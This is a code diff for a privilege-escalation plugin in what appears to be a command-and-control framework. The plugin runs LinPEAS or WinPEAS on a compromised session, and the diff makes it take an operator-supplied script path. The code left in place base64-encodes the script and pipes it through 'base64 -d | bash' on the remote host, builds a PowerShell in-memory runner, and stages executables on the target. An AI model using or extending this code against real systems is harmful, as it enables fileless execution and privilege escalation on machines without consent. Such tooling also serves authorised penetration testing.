@@ -6,39 +6,6 @@ import time
 
 from ..api import plugin, SessionContext
 
-PRIVESC_DIR = os.environ.get(
-    'TORNADOREVC2_PRIVESC_DIR',
-    os.path.join(os.getcwd(), 'tools', 'privesc'),
-)
-
-LINPEAS_CANDIDATES = (
-    'linpeas.sh',
-    'linpeas/linpeas.sh',
-    'linPEAS.sh',
-)
-
-WINPEAS_CANDIDATES = (
-    'winPEAS.bat',
-    'winPEASx64.exe',
-    'winPEASx64_ofs.exe',
-    'winPEASany.exe',
-    'winPEASany_ofs.exe',
-)
-
-
-def _resolve_tool(candidates, env_var=None):
-    if env_var:
-        path = os.environ.get(env_var, '')
-        if path and os.path.isfile(path):
-            return os.path.abspath(path)
-    if not os.path.isdir(PRIVESC_DIR):
-        return None
-    for name in candidates:
-        path = os.path.join(PRIVESC_DIR, name)
-        if os.path.isfile(path):
-            return os.path.abspath(path)
-    return None
-
 
 def _chunk_b64(data: bytes, size=3000):
     encoded = base64.b64encode(data).decode('ascii')
@@ -57,14 +24,10 @@ def _build_linux_pipe_command(script_bytes: bytes) -> str:
         joined = ''.join(chunks)
         return f"printf '%s' '{joined}' | base64 -d | bash 2>&1"
     parts = []
-    for idx, chunk in enumerate(chunks):
+    for chunk in chunks:
         esc = chunk.replace("'", "'\\''")
-        if idx == 0:
-            parts.append(f"printf '%s' '{esc}'")
-        else:
-            parts.append(f"printf '%s' '{esc}'")
-    pipe = ' ; '.join(parts) + ' | base64 -d | bash 2>&1'
-    return pipe
+        parts.append(f"printf '%s' '{esc}'")
+    return ' ; '.join(parts) + ' | base64 -d | bash 2>&1'
 
 
 def _build_windows_bat_command(script_bytes: bytes) -> str:
@@ -72,9 +35,7 @@ def _build_windows_bat_command(script_bytes: bytes) -> str:
     b64 = base64.b64encode(script_bytes).decode('ascii')
     chunk_size = 3000
     chunks = [b64[i:i + chunk_size] for i in range(0, len(b64), chunk_size)]
-    chunk_assigns = '\n'.join(
-        f"$b64+='{c}'" for c in chunks
-    )
+    chunk_assigns = '\n'.join(f"$b64+='{c}'" for c in chunks)
     return f"""
 $ErrorActionPreference='Continue'
 $b64=''
@@ -119,37 +80,56 @@ try {{
 """.strip()
 
 
+def _resolve_local_path(args):
+    if not args:
+        return None, 'Usage: run privesccheck <session_id> <local_script>'
+    raw = ' '.join(args).strip().strip('"').strip("'")
+    if not raw:
+        return None, 'Local script path is required'
+    path = os.path.abspath(os.path.expanduser(raw))
+    if not os.path.isfile(path):
+        return None, f'Local file not found: {path}'
+    return path, None
+
+
 @plugin.command(
     name='privesccheck',
     platforms=['linux', 'windows', 'unix'],
-    description='Run LinPEAS (Linux) or WinPEAS (Windows) privilege escalation enumeration in memory',
+    description='Run LinPEAS (Linux) or WinPEAS (Windows) from an operator-supplied local script path',
 )
 def run(session: SessionContext, args):
     start = time.time()
     is_win = session.is_windows
     tool_name = 'WinPEAS' if is_win else 'LinPEAS'
 
-    if is_win:
-        local_path = _resolve_tool(WINPEAS_CANDIDATES, 'TORNADOREVC2_WINPEAS')
-    else:
-        local_path = _resolve_tool(LINPEAS_CANDIDATES, 'TORNADOREVC2_LINPEAS')
-
-    if not local_path:
-        session.print(
-            f"Place {tool_name} under {PRIVESC_DIR} or set "
-            f"TORNADOREVC2_{'WINPEAS' if is_win else 'LINPEAS'}",
-            'red',
-        )
+    local_path, err = _resolve_local_path(args)
+    if err:
+        session.print(err, 'red')
+        if is_win:
+            session.print('Example: run privesccheck 1 C:\\tools\\winPEAS.bat', 'yellow')
+        else:
+            session.print('Example: run privesccheck 1 ./linpeas.sh', 'yellow')
         return 1
 
+    ext = os.path.splitext(local_path)[1].lower()
+    if is_win:
+        if ext not in ('.bat', '.cmd', '.exe'):
+            session.print(
+                f'Windows privesccheck expects .bat, .cmd, or .exe — got {ext or "(none)"}',
+                'red',
+            )
+            return 1
+    elif ext not in ('.sh', '.bash', ''):
+        session.print(
+            f'Linux privesccheck expects a shell script (.sh) — got {ext}',
+            'yellow',
+        )
+
     session.print(
-        f"Starting {tool_name} from {os.path.basename(local_path)} "
-        f"({'Windows' if is_win else 'Linux'}) — streaming output...",
+        f"Starting {tool_name} from {local_path} — streaming output...",
         'yellow',
     )
     session.log_event(f'Plugin privesccheck: starting {tool_name} ({local_path})')
-
-    output_parts = []
 
     try:
         with open(local_path, 'rb') as fh:
@@ -164,7 +144,7 @@ def run(session: SessionContext, args):
     info = handler._client_info(session._client_sock) or {}
     shell_type = info.get('type', 'windows' if is_win else 'unix')
 
-    if is_win and local_path.lower().endswith('.exe'):
+    if is_win and ext == '.exe':
         token, staging_name = pe._staging_path('windows')
         remote_path = pe._resolve_staging_path(session._client_sock, shell_type, staging_name)
         digest, remote_path = pe._transfer_payload(
